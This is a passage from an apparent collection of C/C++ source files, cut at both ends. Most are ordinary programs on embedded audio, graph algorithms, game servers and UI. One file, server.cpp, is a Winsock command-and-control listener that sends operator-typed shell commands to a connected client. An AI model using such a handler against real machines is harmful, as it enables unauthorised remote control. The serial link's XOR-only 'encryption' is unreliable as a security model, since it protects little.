secure_serial::initial_sequence() {\r\n    LOG_START\r\n    if (first) {\r\n        send_hello();\r\n        recv_pub_key();\r\n        WAIT(CMDRECP);\r\n        send_pub_key();\r\n    } else {\r\n        WAIT(CMDHELLO1);\r\n        send_hello2();\r\n        WAIT(CMDRECP);\r\n        send_pub_key();\r\n        recv_pub_key();\r\n    }\r\n\r\n    LOG_END\r\n}\r\n\r\nvoid secure_serial::send_msg(uint8_t* message, int len) {\r\n    LOG_START\r\n    send(CMDMSG);\r\n    serial->print(len);\r\n    for (int i = 0; i < len; i++) {\r\n        serial->print((char)(message[i] ^ shared_secret[i%key_size]));\r\n    }\r\n    LOG_END\r\n}\r\n\r\nvoid secure_serial::recv_msg(uint8_t* message, int len) {\r\n    LOG_START\r\n    WAIT(CMDMSG);\r\n    int r = serial->read();\r\n    serial->readBytes(message, r);\r\n\r\n    for (int i=0; i<r; ++i) {\r\n        message[i] ^= shared_secret[i % key_size];\r\n    }\r\n    LOG_END\r\n}\r\n\r\nvoid secure_serial::set_public_key(const char *key) {\r\n    memcpy(public_key, key, key_size * 2);\r\n}\r\n\r\nvoid secure_serial::set_private_key(const char *key) {\r\n    memcpy(private_key, key, key_size * 2);\r\n}\r\n\r\nvoid secure_serial::set_shared_secret(const char *secret) {\r\n    memcpy(shared_secret, secret, key_size);\r\n}",
    "#include <bits/stdc++.h>\nusing namespace std;\n\nstruct Node\n{\npublic:\n    int data;\n    Node *left;\n    Node *right;\n    Node(int data)\n    {\n        this->data = data;\n        left = nullptr;\n        right = nullptr;\n    }\n};\n\nvoid printRight(Node *root)\n{\n    vector<int> ans;\n    if (root == nullptr)\n    {\n        return;\n    }\n\n    queue<Node *> q;\n    q.push(root);\n\n    while (!q.empty())\n    {\n        int size = q.size();\n\n        for (int i = 0; i < size; i++)\n        {\n            Node *current = q.front();\n            q.pop();\n\n            if (i == size - 1)\n            {\n                ans.push_back(current->data);\n            }\n            if (current->left)\n            {\n                q.push(current->left);\n            }\n            if (current->right)\n            {\n                q.push(current->right);\n            }\n        }\n    }\n    for (int i = 0; i < ans.size(); i++)\n    {\n        cout << ans[i];\n    }\n}\n\nint main()\n{\n    Node *root = new Node(1);\n    root->left = new Node(2);\n    root->right = new Node(3);\n    root->left->left = new Node(4);\n    root->left->right = new Node(5);\n    printRight(root);\n}",
    "#include <cstdio>\n#include <cstdlib>\n#include <cstring>\n\n#include <3ds.h>\n\n#include \"audio.h\"\n\n// High frequency square wave, PCM16\nvoid fillBuffer(u32 *audio_buffer, size_t size) {\n    for (size_t i = 0; i < size; i++) {\n        u32 data;\n        switch (i % 5) {\n        case 0:\n            data = 0x1000;\n            break;\n        case 1:\n            data = 0x6000;\n            break;\n        case 2:\n            data = 0x4000;\n            break;\n        case 3:\n            data = 0x2000;\n            break;\n        case 4:\n            data = 0x5000;\n            break;\n        }\n        audio_buffer[i] = (data<<16) | (data&0xFFFF);\n    }\n\n    DSP_FlushDataCache(audio_buffer, size);\n}\n\nvoid waitForKey() {\n    while (aptMainLoop()) {\n        gfxSwapBuffers();\n        gfxFlushBuffers();\n        gspWaitForVBlank();\n\n        hidScanInput();\n        u32 kDown = hidKeysDown();\n\n        if (kDown)\n            break;\n    }\n}\n\nint main(int argc, char **argv) {\n    gfxInitDefault();\n\n    PrintConsole botScreen;\n    PrintConsole topScreen;\n\n    consoleInit(GFX_TOP, &topScreen);\n    consoleInit(GFX_BOTTOM, &botScreen);\n    consoleSelect(&topScreen);\n\n    constexpr size_t NUM_SAMPLES = 160*200;\n    u32 *audio_buffer = (u32*)linearAlloc(NUM_SAMPLES * sizeof(u32));\n    fillBuffer(audio_buffer, NUM_SAMPLES);\n\n    AudioState state;\n    {\n        auto dspfirm = loadDspFirmFromFile();\n        if (!dspfirm) {\n            printf(\"Couldn't load firmware\\n\");\n            goto end;\n        }\n        auto ret = audioInit(*dspfirm);\n        if (!ret) {\n            printf(\"Couldn't init audio\\n\");\n            goto end;\n        }\n        state = *ret;\n    }\n\n    state.waitForSync();\n    initSharedMem(state);\n    state.write().dsp_configuration->mixer1_enabled_dirty = true;\n    state.write().dsp_configuration->mixer1_enabled = true;\n    //state.write().dsp_configuration->limiter_enabled = 1;\n    state.notifyDsp();\n    printf(\"init\\n\");\n\n    state.waitForSync();\n    state.notifyDsp();\n    state.waitForSync();\n    for (auto& gain : state.write().source_configurations->config[0].gain) {\n        for (auto& g : gain) {\n            g = 0.0;\n        }\n    }\n    state.write().source_configurations->config[0].gain[0][0] = 1.0;\n    state.write().source_configurations->config[0].gain[1][0] = 1.0;\n    state.write().source_configurations->config[0].gain[1][1] = 0.5;\n    state.write().source_configurations->config[0].gain_1_dirty = true;\n    state.notifyDsp();\n    state.waitForSync();\n    state.notifyDsp();\n    state.waitForSync();\n    state.notifyDsp();\n\n    {\n        while (true) {\n            state.waitForSync();\n            printf(\"sync = %i, play = %i, cbi = %i\\n\", state.read().source_statuses->status[0].sync, state.read().source_statuses->status[0].is_enabled, state.read().source_statuses->status[0].current_buffer_id);\n            if (state.read().source_statuses->status[0].sync == 1) break;\n            state.notifyDsp();\n        }\n        printf(\"fi: %i\\n\", state.frame_id);\n\n        u16 buffer_id = 0;\n        //unsigned next_queue_position = 0;\n\n        state.write().source_configurations->config[0].play_position = 0;\n        state.write().source_configurations->config[0].physical_address = osConvertVirtToPhys(audio_buffer);\n        state.write().source_configurations->config[0].length = NUM_SAMPLES;\n        state.write().source_configurations->config[0].mono_or_stereo = DSP::HLE::SourceConfiguration::Configuration::MonoOrStereo::Stereo;\n        state.write().source_configurations->config[0].format = DSP::HLE::SourceConfiguration::Configuration::Format::PCM16;\n        state.write().source_configurations->config[0].fade_in = false;\n        state.write().source_configurations->config[0].adpcm_dirty = false;\n        state.write().source_configurations->config[0].is_looping = false;\n        state.write().source_configurations->config[0].buffer_id = ++buffer_id;\n        state.write().source_configurations->config[0].partial_reset_flag = true;\n        state.write().source_configurations->config[0].play_position_dirty = true;\n        state.write().source_configurations->config[0].embedded_buffer_dirty = true;\n\n        state.write().source_configurations->config[0].enable = true;\n        state.write().source_configurations->config[0].enable_dirty = true;\n\n        state.notifyDsp();\n\n        bool continue_reading = true;\n        for (size_t frame_count = 0; continue_reading; frame_count++) {\n            state.waitForSync();\n\n            if (state.read().source_statuses->status[0].current_buffer_id) {\n                printf(\"%i cbi = %i\\n\", frame_count, state.read().source_statuses->status[0].current_buffer_id);\n            }\n\n            for (size_t i = 0; i < 160; i++) {\n                if (state.write().intermediate_mix_samples->mix1.pcm32[0][i]) {\n                    printf(\"[intermediate] frame=%i, sample=%i\\n\", frame_count, i);\n                    for (size_t j = 0; j < 20; j++) {\n                        printf(\"%08lx \", (u32)state.write().intermed",
    "#include <GPU_BFS.cuh>\n#include <Union-Find.cuh>\n#include <Workfront-Sweep.cuh>\n#include <GPU_PageRank.cuh>\n// #include <GPU_Community_Detection.cuh>\n\n#include <CPU_BFS.hpp>\n#include <CPU_connected_components.hpp>\n#include <CPU_shortest_paths.hpp>\n#include <CPU_PageRank.hpp>\n#include <CPU_Community_Detection.hpp>\n\n#include <checker.hpp>\n\n#include <time.h>\n\nint main()\n{\n    std::string config_file;\n    std::cout << \"Enter the name of the configuration file:\" << std::endl;\n    std::cin >> config_file;\n    config_file = \"../data/\" + config_file;\n\n    graph_structure<double> graph;\n    graph.read_config(config_file);\n\n    graph.load_LDBC();\n    CSR_graph<double> csr_graph = graph.toCSR();\n    std::cout << \"Number of vertices: \" << csr_graph.OUTs_Neighbor_start_pointers.size() << std::endl;\n    std::cout << \"Number of edges: \" << csr_graph.OUTs_Edges.size() << std::endl;\n\n    float elapsedTime = 0;\n\n    clock_t start = clock(), end = clock();\n\n    if (graph.sup_bfs) {\n        std::vector<int> cpu_bfs_result;\n        start = clock();\n        cpu_bfs_result = CPU_BFS<double>(graph.OUTs, graph.bfs_src);\n        end = clock();\n        printf(\"CPU BFS cost time: %f ms\\n\", (double)(end - start) / CLOCKS_PER_SEC * 1000);\n\n        std::vector<int> gpu_bfs_result;\n        gpu_bfs_result = cuda_bfs(csr_graph, graph.bfs_src, &elapsedTime);\n        elapsedTime = 0;\n        cuda_bfs(csr_graph, graph.bfs_src, &elapsedTime);\n        printf(\"GPU BFS cost time: %f ms\\n\", elapsedTime);\n        elapsedTime = 0;\n\n        bfs_checker(graph, cpu_bfs_result, gpu_bfs_result);\n    }\n\n    if (graph.sup_wcc) {\n        std::vector<std::vector<int>> cpu_wcc_result;\n        start = clock();\n        cpu_wcc_result = CPU_connected_components<double>(graph.OUTs);\n        end = clock();\n        printf(\"CPU WCC cost time: %f ms\\n\", (double)(end - start) / CLOCKS_PER_SEC * 1000);\n\n        std::vector<std::vector<int>> gpu_wcc_result;\n        gpu_wcc_result = gpu_connected_components(csr_graph, &elapsedTime);\n        elapsedTime = 0;\n        gpu_connected_components(csr_graph, &elapsedTime);\n        printf(\"GPU WCC cost time: %f ms\\n\", elapsedTime);\n        elapsedTime = 0;\n\n        wcc_checker(graph, cpu_wcc_result, gpu_wcc_result);\n    }\n\n    if (graph.sup_sssp) {\n        start = clock();\n        std::vector<double> cpu_sssp_result = CPU_shortest_paths(graph.OUTs, graph.sssp_src);\n        end = clock();\n        printf(\"CPU SSSP cost time: %f ms\\n\", (double)(end - start) / CLOCKS_PER_SEC * 1000);\n    \n        elapsedTime = 0;\n        std::vector<double> gpu_sssp_result(graph.V, 0);\n        Workfront_Sweep(csr_graph, graph.sssp_src, gpu_sssp_result, &elapsedTime);\n        printf(\"GPU SSSP cost time: %f ms\\n\", elapsedTime);\n\n        sssp_checker(graph, cpu_sssp_result, gpu_sssp_result);\n    }\n\n    if (graph.sup_pr) {\n        start = clock();\n        CPU_PageRank(graph);\n        end = clock();\n        printf(\"CPU PageRank cost time: %f ms\\n\", (double)(end - start) / CLOCKS_PER_SEC * 1000);\n\n        elapsedTime = 0;\n        PageRank(graph, &elapsedTime);\n        printf(\"GPU PageRank cost time: %f ms\\n\", elapsedTime);\n    }\n\n    /*if (graph.sup_cdlp) {\n        start = clock();\n        CPU_Community_Detection(graph);\n        end = clock();\n        printf(\"CPU Community Detection cost time: %f ms\\n\", (double)(end - start) / CLOCKS_PER_SEC * 1000);\n\n        elapsedTime = 0;\n        Community_Detection(graph, &elapsedTime);\n        printf(\"GPU Community Detection cost time: %f ms\\n\", elapsedTime);\n        elapsedTime = 0;\n    }*/\n\n    return 0;\n}",
    "#include \"nabu_speaker.h\"\n\n#ifdef USE_ESP32\n\n#include <driver/i2s.h>\n\n#include \"esphome/core/application.h\"\n#include \"esphome/core/hal.h\"\n#include \"esphome/core/log.h\"\n\nnamespace esphome {\nnamespace nabu {\n\nstatic const size_t BUFFER_COUNT = 20;\n\nstatic const char *const TAG = \"nabu.speaker\";\n\nvoid NabuSpeaker::setup() {\n  ESP_LOGCONFIG(TAG, \"Setting up I2S Audio Speaker...\");\n\n  this->buffer_queue_ = xQueueCreate(BUFFER_COUNT, sizeof(DataEvent));\n  this->event_queue_ = xQueueCreate(BUFFER_COUNT, sizeof(TaskEvent));\n}\n\nvoid NabuSpeaker::start() { this->state_ = speaker::STATE_STARTING; }\nvoid NabuSpeaker::start_() {\n  this->parent_->start_i2s();\n  this->state_ = speaker::STATE_RUNNING;\n\n  xTaskCreate(NabuSpeaker::player_task, \"speaker_task\", 8192, (void *)this, 0,\n              &this->player_task_handle_);\n}\n\nvoid NabuSpeaker::player_task(void *params) {\n  NabuSpeaker *this_speaker = (NabuSpeaker *)params;\n\n  TaskEvent event;\n  event.type = TaskEventType::STARTING;\n  xQueueSend(this_speaker->event_queue_, &event, portMAX_DELAY);\n\n  DataEvent data_event;\n\n  event.type = TaskEventType::STARTED;\n  xQueueSend(this_speaker->event_queue_, &event, portMAX_DELAY);\n\n  int16_t buffer[BUFFER_SIZE / 2];\n\n  while (true) {\n    if (xQueueReceive(this_speaker->buffer_queue_, &data_event,\n                      100 / portTICK_PERIOD_MS) != pdTRUE) {\n      break; // End of audio from main thread\n    }\n    if (data_event.stop) {\n      // Stop signal from main thread\n      xQueueReset(this_speaker->buffer_queue_); // Flush queue\n      break;\n    }\n    size_t bytes_written;\n\n    memmove(buffer, data_event.data, data_event.len);\n    size_t remaining = data_event.len / 2;\n    size_t current = 0;\n\n    while (remaining > 0) {\n      uint32_t sample = (buffer[current] << 16) | (buffer[current] & 0xFFFF);\n      uint32_t samples[2] = {sample, sample};\n\n      esp_err_t err =\n          i2s_write(this_speaker->parent_->get_port(), &samples,\n                    sizeof(samples), &bytes_written, (10 / portTICK_PERIOD_MS));\n      if (err != ESP_OK) {\n        event = {.type = TaskEventType::WARNING, .err = err};\n        xQueueSend(this_speaker->event_queue_, &event, portMAX_DELAY);\n        continue;\n      }\n      remaining--;\n      current++;\n    }\n\n    event.type = TaskEventType::PLAYING;\n    xQueueSend(this_speaker->event_queue_, &event, portMAX_DELAY);\n  }\n\n  i2s_zero_dma_buffer(this_speaker->parent_->get_port());\n\n  event.type = TaskEventType::STOPPING;\n  xQueueSend(this_speaker->event_queue_, &event, portMAX_DELAY);\n\n  event.type = TaskEventType::STOPPED;\n  xQueueSend(this_speaker->event_queue_, &event, portMAX_DELAY);\n\n  while (true) {\n    delay(10);\n  }\n}\n\nvoid NabuSpeaker::stop() {\n  if (this->state_ == speaker::STATE_STOPPED)\n    return;\n  if (this->state_ == speaker::STATE_STARTING) {\n    this->state_ = speaker::STATE_STOPPED;\n    return;\n  }\n  this->state_ = speaker::STATE_STOPPING;\n  DataEvent data;\n  data.stop = true;\n  xQueueSendToFront(this->buffer_queue_, &data, portMAX_DELAY);\n}\n\nvoid NabuSpeaker::watch_() {\n  TaskEvent event;\n  if (xQueueReceive(this->event_queue_, &event, 0) == pdTRUE) {\n    switch (event.type) {\n    case TaskEventType::STARTING:\n      ESP_LOGD(TAG, \"Starting I2S Audio Speaker\");\n      break;\n    case TaskEventType::STARTED:\n      ESP_LOGD(TAG, \"Started I2S Audio Speaker\");\n      break;\n    case TaskEventType::STOPPING:\n      ESP_LOGD(TAG, \"Stopping I2S Audio Speaker\");\n      break;\n    case TaskEventType::PLAYING:\n      this->status_clear_warning();\n      break;\n    case TaskEventType::STOPPED:\n      this->state_ = speaker::STATE_STOPPED;\n      vTaskDelete(this->player_task_handle_);\n      this->player_task_handle_ = nullptr;\n      xQueueReset(this->buffer_queue_);\n      ESP_LOGD(TAG, \"Stopped I2S Audio Speaker\");\n      break;\n    case TaskEventType::WARNING:\n      ESP_LOGW(TAG, \"Error writing to I2S: %s\", esp_err_to_name(event.err));\n      this->status_set_warning();\n      break;\n    }\n  }\n}\n\nvoid NabuSpeaker::loop() {\n  switch (this->state_) {\n  case speaker::STATE_STARTING:\n    this->start_();\n    break;\n  case speaker::STATE_RUNNING:\n  case speaker::STATE_STOPPING:\n    this->watch_();\n    break;\n  case speaker::STATE_STOPPED:\n    break;\n  }\n}\n\nsize_t NabuSpeaker::play(const uint8_t *data, size_t length) {\n  if (this->state_ != speaker::STATE_RUNNING &&\n      this->state_ != speaker::STATE_STARTING) {\n    this->start();\n  }\n  size_t remaining = length;\n  size_t index = 0;\n  while (remaining > 0) {\n    DataEvent event;\n    event.stop = false;\n    size_t to_send_length = std::min(remaining, BUFFER_SIZE);\n    event.len = to_send_length;\n    memcpy(event.data, data + index, to_send_length);\n    if (xQueueSend(this->buffer_queue_, &event, 0) != pdTRUE) {\n      return index;\n    }\n    remaining -= to_send_length;\n    index += to_send_length;\n  }\n  return index;\n}\n\nbool NabuSpeaker::has_buffered_data() const {\n  return uxQueueMessagesWaiting(this->buffer_queue_) > 0;\n}\n\n} // namespace nabu\n} // namespace esphome",
    "#include <nds.h>\r\n\r\n#include <stdlib.h>\r\n#include <stdio.h>\r\n#include <string.h>\r\n#include <fat.h>\r\n#include <sys/iosupport.h>\r\n\r\n#include \"dsCard.h\"\r\n#include \"GBA_ini.h\"\r\n#include \"ctrl_tbl.h\"\r\n\r\nstruct\tctrl_tbl\tctrl;\r\n\r\n#define\tSRAM_ADDR\t0x0A000000\r\n\r\n\r\nextern\tint\tcarttype;\r\n\r\n#ifdef __cplusplus\r\nextern \"C\" {\r\n#endif\r\n\r\nextern\tvoid\t_RamPG(void);\r\nextern\tvoid\t_RamSave(int bnk);\r\n\r\n#ifdef __cplusplus\r\n}\r\n#endif\r\n\r\n\r\nvoid\tctrl_get()\r\n{\r\n\tFILE\t*exp;\r\n\tchar\texpfile[64];\r\n\r\n\tmemset((u8*)&ctrl, 0, sizeof(struct ctrl_tbl));\r\n\r\n\tif(carttype != 5) {\r\n\t\t_RamPG();\r\n\t\tReadSram(SRAM_ADDR, (u8*)&ctrl, sizeof(struct ctrl_tbl));\r\n\t\t_RamSave(0);\r\n\t\treturn;\r\n\t}\r\n\r\n\tsprintf(expfile, \"%s/EXP128K.dat\", ini.sign_dir);\r\n\texp = fopen(expfile, \"rb\");\r\n\tif(exp != NULL) {\r\n\t\tfread(&ctrl, 1, sizeof(struct ctrl_tbl), exp);\r\n\t\tfclose(exp);\r\n\t}\r\n}\r\n\r\nvoid\tctrl_set()\r\n{\r\n\tFILE\t*exp;\r\n\tchar\texpfile[64];\r\n\r\n\r\n\tif(carttype != 5) {\r\n\t\t_RamPG();\r\n\t\tWriteSram(SRAM_ADDR, (u8*)&ctrl, sizeof(struct ctrl_tbl));\r\n\t\t_RamSave(0);\r\n\t\treturn;\r\n\t}\r\n\r\n\tsprintf(expfile, \"%s/EXP128K.dat\", ini.sign_dir);\r\n\texp = fopen(expfile, \"wb\");\r\n\tif(exp != NULL) {\r\n\t\tfwrite(&ctrl, 1, sizeof(struct ctrl_tbl), exp);\r\n\t\tfclose(exp);\r\n\t}\r\n}\r\n\r\n",
    "#include \"win32_window.h\"\n\n#include <dwmapi.h>\n#include <flutter_windows.h>\n\n#include \"resource.h\"\n\nnamespace {\n\n/// Window attribute that enables dark mode window decorations.\n///\n/// Redefined in case the developer's machine has a Windows SDK older than\n/// version 10.0.22000.0.\n/// See: https://docs.microsoft.com/windows/win32/api/dwmapi/ne-dwmapi-dwmwindowattribute\n#ifndef DWMWA_USE_IMMERSIVE_DARK_MODE\n#define DWMWA_USE_IMMERSIVE_DARK_MODE 20\n#endif\n\nconstexpr const wchar_t kWindowClassName[] = L\"FLUTTER_RUNNER_WIN32_WINDOW\";\n\n/// Registry key for app theme preference.\n///\n/// A value of 0 indicates apps should use dark mode. A non-zero or missing\n/// value indicates apps should use light mode.\nconstexpr const wchar_t kGetPreferredBrightnessRegKey[] =\n  L\"Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Themes\\\\Personalize\";\nconstexpr const wchar_t kGetPreferredBrightnessRegValue[] = L\"AppsUseLightTheme\";\n\n// The number of Win32Window objects that currently exist.\nstatic int g_active_window_count = 0;\n\nusing EnableNonClientDpiScaling = BOOL __stdcall(HWND hwnd);\n\n// Scale helper to convert logical scaler values to physical using passed in\n// scale factor\nint Scale(int source, double scale_factor) {\n  return static_cast<int>(source * scale_factor);\n}\n\n// Dynamically loads the |EnableNonClientDpiScaling| from the User32 module.\n// This API is only needed for PerMonitor V1 awareness mode.\nvoid EnableFullDpiSupportIfAvailable(HWND hwnd) {\n  HMODULE user32_module = LoadLibraryA(\"User32.dll\");\n  if (!user32_module) {\n    return;\n  }\n  auto enable_non_client_dpi_scaling =\n      reinterpret_cast<EnableNonClientDpiScaling*>(\n          GetProcAddress(user32_module, \"EnableNonClientDpiScaling\"));\n  if (enable_non_client_dpi_scaling != nullptr) {\n    enable_non_client_dpi_scaling(hwnd);\n  }\n  FreeLibrary(user32_module);\n}\n\n}  // namespace\n\n// Manages the Win32Window's window class registration.\nclass WindowClassRegistrar {\n public:\n  ~WindowClassRegistrar() = default;\n\n  // Returns the singleton registar instance.\n  static WindowClassRegistrar* GetInstance() {\n    if (!instance_) {\n      instance_ = new WindowClassRegistrar();\n    }\n    return instance_;\n  }\n\n  // Returns the name of the window class, registering the class if it hasn't\n  // previously been registered.\n  const wchar_t* GetWindowClass();\n\n  // Unregisters the window class. Should only be called if there are no\n  // instances of the window.\n  void UnregisterWindowClass();\n\n private:\n  WindowClassRegistrar() = default;\n\n  static WindowClassRegistrar* instance_;\n\n  bool class_registered_ = false;\n};\n\nWindowClassRegistrar* WindowClassRegistrar::instance_ = nullptr;\n\nconst wchar_t* WindowClassRegistrar::GetWindowClass() {\n  if (!class_registered_) {\n    WNDCLASS window_class{};\n    window_class.hCursor = LoadCursor(nullptr, IDC_ARROW);\n    window_class.lpszClassName = kWindowClassName;\n    window_class.style = CS_HREDRAW | CS_VREDRAW;\n    window_class.cbClsExtra = 0;\n    window_class.cbWndExtra = 0;\n    window_class.hInstance = GetModuleHandle(nullptr);\n    window_class.hIcon =\n        LoadIcon(window_class.hInstance, MAKEINTRESOURCE(IDI_APP_ICON));\n    window_class.hbrBackground = 0;\n    window_class.lpszMenuName = nullptr;\n    window_class.lpfnWndProc = Win32Window::WndProc;\n    RegisterClass(&window_class);\n    class_registered_ = true;\n  }\n  return kWindowClassName;\n}\n\nvoid WindowClassRegistrar::UnregisterWindowClass() {\n  UnregisterClass(kWindowClassName, nullptr);\n  class_registered_ = false;\n}\n\nWin32Window::Win32Window() {\n  ++g_active_window_count;\n}\n\nWin32Window::~Win32Window() {\n  --g_active_window_count;\n  Destroy();\n}\n\nbool Win32Window::Create(const std::wstring& title,\n                         const Point& origin,\n                         const Size& size) {\n  Destroy();\n\n  const wchar_t* window_class =\n      WindowClassRegistrar::GetInstance()->GetWindowClass();\n\n  const POINT target_point = {static_cast<LONG>(origin.x),\n                              static_cast<LONG>(origin.y)};\n  HMONITOR monitor = MonitorFromPoint(target_point, MONITOR_DEFAULTTONEAREST);\n  UINT dpi = FlutterDesktopGetDpiForMonitor(monitor);\n  double scale_factor = dpi / 96.0;\n\n  HWND window = CreateWindow(\n      window_class, title.c_str(), WS_OVERLAPPEDWINDOW,\n      Scale(origin.x, scale_factor), Scale(origin.y, scale_factor),\n      Scale(size.width, scale_factor), Scale(size.height, scale_factor),\n      nullptr, nullptr, GetModuleHandle(nullptr), this);\n\n  if (!window) {\n    return false;\n  }\n\n  UpdateTheme(window);\n\n  return OnCreate();\n}\n\nbool Win32Window::Show() {\n  return ShowWindow(window_handle_, SW_SHOWNORMAL);\n}\n\n// static\nLRESULT CALLBACK Win32Window::WndProc(HWND const window,\n                                      UINT const message,\n                                      WPARAM const wparam,\n                                      LPARAM const lparam) noexcept {\n  if (message == WM_NCCREATE) {\n    auto window_struct = reinterpret_cast<CREATESTRUCT*>(lparam);\n    Se",
    "#include <stdio.h>\r\n#include <math.h>\r\n#include \"TriMath.h\"\r\n\r\n#define PI acos(-1)\r\n\r\n\r\ndouble pi_deviat(double pi){\r\n\treturn cal_abs(pi - PI) / PI;\r\n}\r\n\r\n\r\ndouble sin_deviat(double angle, int n, double pi){\r\n\tdouble rad_pi = angle_2_rad(angle, pi);\r\n\tdouble rad_PI = angle_2_rad(angle, PI);\r\n\tdouble tl_sin = taylor_sin(rad_pi, n, pi);\r\n\tdouble nom_sin = sin(rad_PI);\r\n\tprintf(\"normal sine is %lf, approximated sine is %lf\\n\", nom_sin, tl_sin);\r\n\treturn cal_abs((tl_sin - nom_sin) / nom_sin);\r\n}\r\n\r\n\r\ndouble cos_deviat(double angle, int n, double pi){\r\n\tdouble rad_pi = angle_2_rad(angle, pi);\r\n\tdouble rad_PI = angle_2_rad(angle, PI);\r\n\tdouble tl_cos = taylor_cos(rad_pi, n, pi);\r\n\tdouble nom_cos = cos(rad_PI);\r\n\tprintf(\"normal cosine is %lf, approximated cosine is %lf\\n\", nom_cos, tl_cos);\r\n\treturn cal_abs((tl_cos - nom_cos) / nom_cos);\r\n}\r\n\r\n\r\ndouble tan_deviat(double angle, int n, double pi){\r\n\tdouble rad_pi = angle_2_rad(angle, pi);\r\n\tdouble rad_PI = angle_2_rad(angle, PI);\r\n\tdouble tl_tan = taylor_tan(rad_pi, n, pi);\r\n\tdouble nom_tan = tan(rad_PI);\r\n\tprintf(\"normal tangent is %lf, approximated tangent is %lf\\n\", nom_tan, tl_tan);\r\n\treturn cal_abs((tl_tan - nom_tan) / nom_tan);\r\n}\r\n\r\n\r\ndouble arcs_deviat(double x, int n, double accu, double pi){\r\n\tdouble cmp_rad = cmp_arcs(x, n, accu, pi);\r\n\tdouble nom_rad = asin(x);;\r\n\tdouble cmp_angle = rad_2_angle(cmp_rad, pi);\r\n\tdouble nom_angle = rad_2_angle(nom_rad, PI);\r\n\tprintf(\"normal arcsine is %lf, approximated arcsine is %lf\\n\", nom_angle, cmp_angle);\r\n\treturn cal_abs((cmp_angle - nom_angle) / nom_angle);\r\n}\r\n\r\n\r\ndouble arcc_deviat(double x, int n, double accu, double pi){\r\n\tdouble cmp_rad = cmp_arcc(x, n, accu, pi);\r\n\tdouble nom_rad = acos(x);\r\n\tdouble cmp_angle = rad_2_angle(cmp_rad, pi);\r\n\tdouble nom_angle = rad_2_angle(nom_rad, PI);\r\n\tprintf(\"normal arccosine is %lf, approximated arccosine is %lf\\n\", nom_angle, cmp_angle);\r\n\treturn cal_abs((cmp_angle - nom_angle) / nom_angle);\r\n}\r\n\r\n\r\ndouble arct_deviat(double x, int n, double accu, double pi){\r\n\tdouble cmp_rad = cmp_arct(x, n, accu, pi);\r\n\tdouble nom_rad = atan(x);\r\n\tdouble cmp_angle = rad_2_angle(cmp_rad, pi);\r\n\tdouble nom_angle = rad_2_angle(nom_rad, PI);\t\r\n\tprintf(\"normal arctangent is %lf, approximated arctangent is %lf\\n\", nom_angle, cmp_angle);\r\n\treturn cal_abs((cmp_angle - nom_angle) / nom_angle);\r\n}\r\n\r\n",
    "// Build using the command => g++ server.cpp -o server.exe -lws2_32 -static-libstdc++ -static-libgcc -static\n// g++ server.cpp -o server.exe -lws2_32\n\n#include <iostream>\n#include <winsock2.h>\n#include <ws2tcpip.h>\n#include <string.h>\n\nusing namespace std;\n\n#define BUFFER_SIZE 2048\n#define PORT 55555\n#define IP_ADDR \"10.10.15.177\"\n\nint main(int argc, char const *argv[]){\n\n    SOCKET serverSocket, acceptSocket;\n    WSADATA wsaData;\n    \n    if( WSAStartup(MAKEWORD(2,2),&wsaData) != 0){\n        cout<< \" Failed at WSAStartup !\" <<endl;\n        return -1;\n    }\n    cout<< \"[*] WSAStartup successful \"<<endl;\n\n    serverSocket = INVALID_SOCKET;\n    serverSocket = socket(AF_INET,SOCK_STREAM,IPPROTO_TCP);\n\n    if(serverSocket == INVALID_SOCKET){\n        cout << \"Error at socket()\"<<endl;\n        WSACleanup();\n        return -1;\n    }\n    cout<< \"[*] Socket successful \"<<endl;\n\n    sockaddr_in service;\n    service.sin_family = AF_INET;\n    service.sin_addr.s_addr = inet_addr(IP_ADDR);\n    service.sin_port = htons(PORT);\n    memset(&(service.sin_zero),0,8);\n\n    if(bind(serverSocket,(SOCKADDR *)&service,sizeof(service)) == SOCKET_ERROR){\n        cout << \"Bind failed\"<<endl;\n        WSACleanup();\n        return -1;\n    }\n    cout<< \"[*] Bind successful \"<<endl;\n\n    if(listen(serverSocket,1) == SOCKET_ERROR){\n        cout << \"Listen failed\"<<endl;\n        WSACleanup();\n        return -1;\n    }\n\n    cout<< \"[*] Listening for incoming connections ...\"<<endl;\n\n    acceptSocket = accept(serverSocket,NULL,NULL);\n    if(acceptSocket == INVALID_SOCKET){\n        cout << \"Accept failed\"<<endl;\n        WSACleanup();\n        return -1;\n    }\n\n    int response;\n    \n    char receivedData[BUFFER_SIZE];\n    char sendData[BUFFER_SIZE];\n    char cwd[BUFFER_SIZE];\n\n    strcpy(receivedData,\"cd\");\n    strcpy(sendData,\"\\0\");\n\n    bool isCWD = true;\n\n    while (true){\n        response = recv(acceptSocket,receivedData,BUFFER_SIZE,0);\n        if(isCWD){\n            strcpy(cwd,receivedData);\n            strcpy(receivedData,\"\\0\");\n            isCWD = false;\n        }\n        if(receivedData != \"\\0\"){\n            cout<<receivedData<<endl;\n            strcpy(receivedData,\"\\0\");\n        }\n\n        cout<<cwd<<\">\";\n        cin.getline(sendData,BUFFER_SIZE);\n\n        string command(sendData);\n        \n        if(strcmp(command.substr(0,2).c_str(),\"cd\") == 0){\n            isCWD = true;\n        }\n        response = send(acceptSocket,sendData,BUFFER_SIZE,0);\n        if(strcmp(command.c_str(),\"exit\") == 0){\n            return -1;\n        }\n    }\n\n    WSACleanup();\n\n    cout<<endl;\n    return 0;\n}\n",
    "// Copyright 2024 Black Tek Server Authors. All rights reserved.\n// Use of this source code is governed by the GPL-2.0 License that can be found in the LICENSE file.\n\n#include \"otpch.h\"\n\n#include \"iomapserialize.h\"\n#include \"game.h\"\n#include \"bed.h\"\n\n#include <fmt/format.h>\n\nextern Game g_game;\n\nvoid IOMapSerialize::loadHouseItems(Map* map)\n{\n\tint64_t start = OTSYS_TIME();\n\n\tDBResult_ptr result = Database::getInstance().storeQuery(\"SELECT `data` FROM `tile_store`\");\n\tif (!result) {\n\t\treturn;\n\t}\n\n\tdo {\n\n\t\tauto attr = result->getString(\"data\");\n\t\tPropStream propStream;\n\t\tpropStream.init(attr.data(), attr.size());\n\n\t\tuint16_t x, y;\n\t\tuint8_t z;\n\t\tif (!propStream.read<uint16_t>(x) || !propStream.read<uint16_t>(y) || !propStream.read<uint8_t>(z)) {\n\t\t\tcontinue;\n\t\t}\n\n\t\tTile* tile = map->getTile(x, y, z);\n\t\tif (!tile) {\n\t\t\tcontinue;\n\t\t}\n\n\t\tuint32_t item_count;\n\t\tif (!propStream.read<uint32_t>(item_count)) {\n\t\t\tcontinue;\n\t\t}\n\n\t\twhile (item_count--) {\n\t\t\tloadItem(propStream, tile);\n\t\t}\n\t} while (result->next());\n\tstd::cout << \"> Loaded house items in: 